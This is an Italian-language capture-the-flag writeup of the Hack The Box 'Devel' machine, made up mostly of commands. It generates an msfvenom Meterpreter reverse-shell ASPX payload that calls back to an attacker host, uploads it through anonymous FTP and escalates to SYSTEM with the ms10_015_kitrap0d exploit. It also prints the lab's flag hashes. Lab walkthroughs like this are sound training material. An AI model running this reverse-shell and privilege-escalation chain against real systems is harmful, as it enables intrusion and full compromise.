![](devel.png)
# Devel -Hack The Box Writeup

## Scansione nmap
```bash 
nmap -sCV -O 10.129.12.240
```
```bash
ftp anonymous@ip
pass anonymous
```
dopo aver fatto una ricerca accurata notiamo che
(https://hacktricks.wiki/en/network-services-pentesting/pentesting-web/iis-internet-information-services.html)

 microsoft iis7 esegue file .aspx

## msfvenom
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.130 LPORT=3000 -f aspx -o shell.aspx
```
## ftp
```bash
put shell.aspx
```
mettiamoci in ascolto sopra la porta indicata (3000)
```bash
search mutli/handler
```
impostiamo la shell in background per fare privilege escalation
# Privilege Escalation
```bash
search multi/recon/local_exploit_suggester)
set session 1
utilizziamo 
(windows/local/ms10_015_kitrap0d) >
getuid
Server username: NT AUTHORITY\SYSTEM
cat c:\Users\babis\desktop\user.txt
```
# flag user 
## 35d2b9213b431957ab13dcdddc298277
```bash
cat c:\Users\Administrator\Desktop\root.txt
```
# flag root 
## a915a57e42c366ec230dd740a00c9e94